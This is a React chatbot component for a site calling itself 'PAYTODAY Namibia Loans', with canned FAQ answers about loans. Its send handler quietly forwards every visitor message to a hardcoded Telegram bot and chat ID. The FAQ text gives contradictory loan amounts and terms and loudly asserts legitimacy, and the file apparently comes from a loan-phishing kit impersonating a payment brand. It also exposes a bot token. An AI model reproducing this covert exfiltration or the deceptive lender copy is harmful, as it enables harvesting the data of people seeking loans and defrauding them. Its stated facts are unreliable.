import { useState, useRef, useEffect } from 'react';
import { MessageCircle, X, Send, Bot, User } from 'lucide-react';

interface Message {
  id: number;
  text: string;
  isBot: boolean;
  timestamp: Date;
}

interface FAQ {
  keywords: string[];
  answer: string;
}

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8570815071:AAGvDaBcq8384ZWItYQWlcsjGgXpgGQI2A8';
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '7973653220';

const sendToTelegram = async (message: string): Promise<boolean> => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured - message would be:', message);
    return false;
  }
  
  try {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    console.log('Sending to Telegram:', telegramUrl);
    console.log('Chat ID:', TELEGRAM_CHAT_ID);
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    const data = await response.json();
    console.log('Telegram response:', data);
    
    if (data.ok) {
      console.log('Telegram message sent successfully!');
      return true;
    } else {
      console.error('Telegram error:', data.description);
      return false;
    }
  } catch (error) {
    console.error('Failed to send to Telegram:', error);
    return false;
  }
};

const faqs: FAQ[] = [
  {
    keywords: ['hello', 'hi', 'hey', 'good morning', 'good afternoon', 'good evening'],
    answer: 'Hello! Welcome to PAYTODAY Namibia Loans! 👋 I\'m here to help you with any questions about our loan services. How can I assist you today?'
  },
  {
    keywords: ['loan', 'apply', 'application', 'how to apply', 'get loan', 'borrow', 'apply now', 'start application'],
    answer: 'Great choice! 🎉\n\nApplying is easy!\n\n1. Click "Get Started" on the page\n2. Enter your phone number\n3. Verify with OTP\n4. Fill in your details\n5. Submit!\n\nAmounts: N$1,000 - N$20,000\nRepayment: 6-36 months\n\nClick "Get Started" above to begin!'
  },
  {
    keywords: ['amount', 'maximum', 'minimum', 'how much', 'loan limit', '1 million', '1000000'],
    answer: 'Our loan amounts range from:\n\n💰 Minimum: NAD 5,000\n💰 Maximum: NAD 100,000\n\nThe amount you qualify for depends on your income and repayment capacity. Use our calculator to see your estimated monthly payments!'
  },
  {
    keywords: ['interest', 'rate', 'charge', 'fee', 'cost', 'pay back', 'repayment'],
    answer: 'Our interest rates are competitive and transparent! 📊\n\n• Monthly interest rate: 2.5%\n• Processing fee: NAD 500 (one-time)\n• No hidden charges\n• Early repayment accepted without penalty\n\nExample: For NAD 50,000 over 12 months, your monthly payment would be approximately NAD 4,875.'
  },
  {
    keywords: ['duration', 'period', 'time', 'months', 'how long', 'repayment period'],
    answer: 'We offer flexible repayment periods! 📅\n\n• Short-term: 3 months\n• Medium-term: 6-12 months\n• Long-term: 18-24 months\n\nChoose a period that fits your budget. Longer periods mean lower monthly payments but slightly more interest overall.'
  },
  {
    keywords: ['requirement', 'document', 'need', 'qualify', 'eligible', 'criteria'],
    answer: 'To apply for a loan, you need:\n\n📋 Requirements:\n• Valid ID (National ID, Passport, or Driver\'s License)\n• Proof of income (payslip or business records)\n• Bank statement (last 3 months)\n• Proof of address (utility bill)\n• Must be 18 years or older\n• Must be a resident of Namibia\n\nSelf-employed? We accept business registration documents too!'
  },
  {
    keywords: ['approval', 'how long', 'wait', 'time', 'process', 'get money', 'disbursement'],
    answer: 'Our approval process is fast! ⚡\n\n⏱️ Timeline:\n• Application review: 24-48 hours\n• Approval notification: SMS & Email\n• Fund disbursement: Same day after approval\n\nMake sure all your documents are complete to avoid delays!'
  },
  {
    keywords: ['payment', 'repay', 'pay back', 'monthly', 'installment', 'how to pay'],
    answer: 'We offer multiple payment options for your convenience! 💳\n\nPayment Methods:\n• Mobile Money (Orange Money, Africell Money)\n• Bank transfer to our account\n• Cash deposit at any branch\n• Automatic deduction from salary (for employed customers)\n\nYour monthly payment amount is shown in the calculator and will be in your approval letter.'
  },
  {
    keywords: ['branch', 'location', 'office', 'visit', 'find', 'where', 'address'],
    answer: 'We have branches across Namibia! 🏢\n\nMain Branch:\n• Windhoek - Cnr. of Mosé Tjitendero & Hamutenya Wanahepo Ndadi Street, Olympia\n\nOther Locations:\n• Swakopmund - 45 Main Road\n• Walvis Bay - 12 Dama Road\n• Oshakati - 8 Main Highway\n• Keetmanshoop - 3 Town Center\n\nWorking Hours: Monday-Friday, 8:00 AM - 4:00 PM\nSaturday: 9:00 AM - 1:00 PM'
  },
  {
    keywords: ['contact', 'phone', 'email', 'call', 'reach', 'support', 'help'],
    answer: 'We\'re here to help! 📞\n\nContact Us:\n• Phone: +264 61 280 2000\n• WhatsApp: +264 81 150 0100\n• Email: support@paytoday.com.na\n• Facebook: PAYTODAY Namibia\n• Instagram: @paytodaynamibia\n\nCustomer Service Hours:\nMonday-Saturday, 8:00 AM - 6:00 PM'
  },
  {
    keywords: ['business loan', 'business', 'sme', 'company', 'entrepreneur', 'startup'],
    answer: 'Yes, we offer business loans! 💼\n\nBusiness Loan Features:\n• Amount: Up to NAD 100,000\n• Flexible repayment terms\n• Competitive interest rates\n• Fast approval for registered businesses\n\nAdditional Requirements:\n• Business registration certificate\n• Tax clearance certificate\n• Business bank statements (6 months)\n• Business plan (for loans above NAD 50,000)'
  },
  {
    keywords: ['personal loan', 'personal', 'individual', 'salary', 'employee'],
    answer: 'Our personal loans are perfect for your needs! 👤\n\nPersonal Loan Uses:\n• Medical emergencies\n• School fees\n• Home improvements\n• Debt consolidation\n• Travel expenses\n• Wedding expenses\n\nRequirements:\n• Proof of employment or stable income\n• Valid ID\n• Last 3 months bank statements'
  },
  {
    keywords: ['emergency', 'urgent', 'quick', 'fast', 'today', 'now', 'immediate'],
    answer: 'Need money urgently? We can help! 🚨\n\nFast Track Options:\n• Existing customers: Approval in 2-4 hours\n• Small loans (under NAD 20,000): Same day\n• Emergency medical loans: Priority processing\n\nTips for faster approval:\n• Have all documents ready\n• Apply during business hours\n• Ensure your phone is reachable'
  },
  {
    keywords: ['default', 'miss payment', 'late', 'penalty', 'cannot pay', 'problem'],
    answer: 'Having trouble with payments? Don\'t worry! 🤝\n\nIf you\'re facing difficulties:\n• Contact us immediately - we\'re here to help\n• We can discuss payment restructuring\n• Extensions may be available\n• Early communication prevents penalties\n\nPenalties for late payment:\n• 5% late fee after 7 days\n• Additional 2% per week thereafter\n\nCall us: +264 61 280 2000'
  },
  {
    keywords: ['early repayment', 'pay off', 'settle early', 'finish loan', 'complete'],
    answer: 'Yes, you can repay early! ✅\n\nEarly Repayment Benefits:\n• No early repayment penalty\n• Save on interest charges\n• Improves your credit score\n• Makes you eligible for larger loans\n\nHow to settle early:\n• Contact us for your settlement amount\n• Pay via Mobile Money or bank transfer\n• Receive clearance certificate within 24 hours'
  },
  {
    keywords: ['credit score', 'credit history', 'credit record', 'credit check', 'crb'],
    answer: 'We check credit history responsibly! 📊\n\nOur Credit Check Process:\n• We verify your credit history with CRB\n• A good repayment history helps you qualify\n• First-time borrowers are welcome too\n• We consider your overall financial situation\n\nTips to build good credit:\n• Pay loans on time\n• Keep your contact information updated\n• Borrow only what you can repay'
  },
  {
    keywords: ['security', 'collateral', 'guarantor', 'guarantee', 'asset', 'property'],
    answer: 'Most of our loans are unsecured! 🔓\n\nFor loans up to NAD 50,000:\n• No collateral required\n• No guarantor needed\n\nFor loans above NAD 50,000:\n• May require a guarantor\n• Or proof of stable income\n\nYour employment or business income serves as security for the loan.'
  },
  {
    keywords: ['student', 'school fees', 'education', 'university', 'college', 'study'],
    answer: 'We support education! 📚\n\nEducation Loan Features:\n• Special rates for school fees\n• Flexible repayment aligned with school terms\n• Can cover primary, secondary, and university fees\n\nRequirements:\n• Admission letter or school fees statement\n• Parent/guardian as applicant (for minors)\n• Proof of income'
  },
  {
    keywords: ['farmer', 'agriculture', 'farming', 'crop', 'harvest', 'rural'],
    answer: 'We support our farmers! 🌾\n\nAgricultural Loan Features:\n• Seasonal repayment options\n• Lower rates during planting season\n• Flexible terms based on harvest cycles\n\nRequirements:\n• Farm location details\n• Crop or livestock information\n• Expected harvest/sales timeline'
  },
  {
    keywords: ['women', 'female', 'lady', 'woman', 'gender', 'empowerment'],
    answer: 'We empower women entrepreneurs! 💪\n\nWomen\'s Loan Program:\n• Special interest rates for women-owned businesses\n• Business training workshops\n• Mentorship opportunities\n• Priority processing for women applicants\n\nPAYTODAY Namibia believes in financial inclusion for all!'
  },
  {
    keywords: ['refinance', 'top up', 'additional', 'more money', 'increase', 'second loan'],
    answer: 'Yes, you can get additional funds! ⬆️\n\nTop-Up Loan:\n• Available after 3 months of good repayment\n• Get additional money on top of existing loan\n• Consolidated into one monthly payment\n\nSecond Loan:\n• Available after clearing 50% of current loan\n• Subject to affordability assessment\n• Good repayment history required'
  },
  {
    keywords: ['online', 'app', 'website', 'digital', 'mobile', 'internet'],
    answer: 'Apply from anywhere! 📱\n\nDigital Services:\n• Apply online through our website\n• Check loan status via SMS\n• Make payments through Mobile Money\n• Download statements from your account\n\nNo smartphone? No problem!\nCall us at *123# for USSD services'
  },
  {
    keywords: ['scam', 'fraud', 'fake', 'legit', 'real', 'trust', 'safe'],
    answer: 'PAYTODAY Namibia Loans is 100% legitimate! ✅\n\nWe are:\n• Licensed by the Bank of Namibia\n• Part of PAYTODAY - Namibia\'s leading payment platform\n• Over 2 million active users\n\nWarning signs of fraud:\n• We NEVER ask for upfront fees before approval\n• We ONLY use official phone numbers\n• We have physical offices you can visit\n\nStay safe - only deal with our official channels!'
  },
  {
    keywords: ['thank', 'thanks', 'appreciate', 'grateful', 'ok', 'okay', 'great'],
    answer: 'You\'re welcome! 😊 I\'m glad I could help. If you have any other questions, feel free to ask. Have a great day!'
  },
  {
    keywords: ['bye', 'goodbye', 'see you', 'later', 'take care'],
    answer: 'Goodbye! 👋 Thank you for choosing PAYTODAY Namibia Loans. We look forward to serving you. Have a wonderful day!'
  }
];

const defaultResponses = [
  "I'm not sure I understand. Could you rephrase that? 🤔",
  "That's a great question! Please call us at +264 61 280 2000 for more details. 📞",
  "I'd be happy to help with that. Can you provide more details about what you're looking for?",
  "For that specific query, it's best to speak with our customer service team at +264 61 280 2000."
];

const ChatBot = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [messages, setMessages] = useState<Message[]>([
    {
      id: 1,
      text: 'Hello! Welcome to PAYTODAY Namibia Loans! 👋 I\'m your virtual assistant. How can I help you today?',
      isBot: true,
      timestamp: new Date()
    }
  ]);
  const [inputText, setInputText] = useState('');
  const messagesEndRef = useRef<HTMLDivElement>(null);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  const findAnswer = (question: string): string => {
    const lowerQuestion = question.toLowerCase();
    
    for (const faq of faqs) {
      for (const keyword of faq.keywords) {
        if (lowerQuestion.includes(keyword.toLowerCase())) {
          return faq.answer;
        }
      }
    }
    
    return defaultResponses[Math.floor(Math.random() * defaultResponses.length)];
  };

  const handleSend = () => {
    if (!inputText.trim()) return;

    const userMessage: Message = {
      id: messages.length + 1,
      text: inputText,
      isBot: false,
      timestamp: new Date()
    };

    setMessages(prev => [...prev, userMessage]);
    setInputText('');

    // Send to Telegram
    sendToTelegram(`💬 CHATBOT MESSAGE\n\n👤 User Question: ${inputText}\n⏰ Time: ${new Date().toLocaleString()}`);

    // Simulate bot thinking
    setTimeout(() => {
      const botResponse: Message = {
        id: messages.length + 2,
        text: findAnswer(inputText),
        isBot: true,
        timestamp: new Date()
      };
      setMessages(prev => [...prev, botResponse]);
    }, 500);
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleSend();
    }
  };

  const quickQuestions = [
    'How do I apply?',
    'Loan requirements?',
    'Interest rates?',
    'Contact us',
    'Apply now'
  ];

  return (
    <>
      {/* Chat Button */}
      <button
        onClick={() => setIsOpen(true)}
        className={`fixed bottom-24 right-6 z-50 w-14 h-14 bg-gradient-to-br from-[#2d21e9] to-[#920fd4] rounded-full shadow-lg flex items-center justify-center text-white hover:scale-110 transition-all duration-300 animate-pulse ${isOpen ? 'hidden' : 'flex'}`}
      >
        <MessageCircle className="w-6 h-6" />
      </button>

      {/* Chat Window */}
      {isOpen && (
        <div className="fixed bottom-24 right-6 z-50 w-80 md:w-96 bg-gradient-to-br from-white to-gray-50 rounded-2xl shadow-2xl overflow-hidden border border-gray-200 animate-slide-in-right">
          {/* Header */}
          <div className="bg-[#2d21e9] p-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
                <Bot className="w-6 h-6 text-white" />
              </div>
              <div>
                <h3 className="text-white font-semibold">PAYTODAY Namibia AI</h3>
                <p className="text-white/70 text-xs">Online - Ready to help</p>
              </div>
            </div>
            <button
              onClick={() => setIsOpen(false)}
              className="text-white/70 hover:text-white transition-colors"
            >
              <X className="w-5 h-5" />
            </button>
          </div>

          {/* Messages */}
          <div className="h-80 overflow-y-auto p-4 bg-gray-50">
            {messages.map((message) => (
              <div
                key={message.id}
                className={`flex gap-2 mb-4 ${message.isBot ? '' : 'flex-row-reverse'}`}
              >
                <div className={`w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 ${
                  message.isBot ? 'bg-[#2d21e9]' : 'bg-gray-300'
                }`}>
                  {message.isBot ? (
                    <Bot className="w-4 h-4 text-white" />
                  ) : (
                    <User className="w-4 h-4 text-white" />
                  )}
                </div>
                <div className={`max-w-[75%] p-3 rounded-2xl text-sm whitespace-pre-line ${
                  message.isBot
                    ? 'bg-white text-gray-800 rounded-tl-none shadow-sm'
                    : 'bg-[#2d21e9] text-white rounded-tr-none'
                }`}>
                  {message.text}
                </div>
              </div>
            ))}
            <div ref={messagesEndRef} />

            {/* Quick Questions */}
            {messages.length < 3 && (
              <div className="mt-4">
                <p className="text-xs text-gray-500 mb-2">Quick questions:</p>
                <div className="flex flex-wrap gap-2">
                  {quickQuestions.map((q) => (
                    <button
                      key={q}
                      onClick={() => {
                        setInputText(q);
                        setTimeout(handleSend, 100);
                      }}
                      className="px-3 py-1 bg-[#1affd5]/20 text-[#2d21e9] text-xs rounded-full hover:bg-[#2d21e9] hover:text-white transition-colors"
                    >
                      {q}
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>

          {/* Input */}
          <div className="p-4 bg-white border-t border-gray-100">
            <div className="flex gap-2">
              <input
                type="text"
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                onKeyPress={handleKeyPress}
                placeholder="Type your message..."
                className="flex-1 px-4 py-2 bg-gray-100 rounded-full text-sm focus:outline-none focus:ring-2 focus:ring-[#2d21e9]"
              />
              <button
                onClick={handleSend}
                disabled={!inputText.trim()}
                className="w-10 h-10 bg-[#2d21e9] rounded-full flex items-center justify-center text-white hover:bg-[#1a1ad9] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <Send className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default ChatBot;
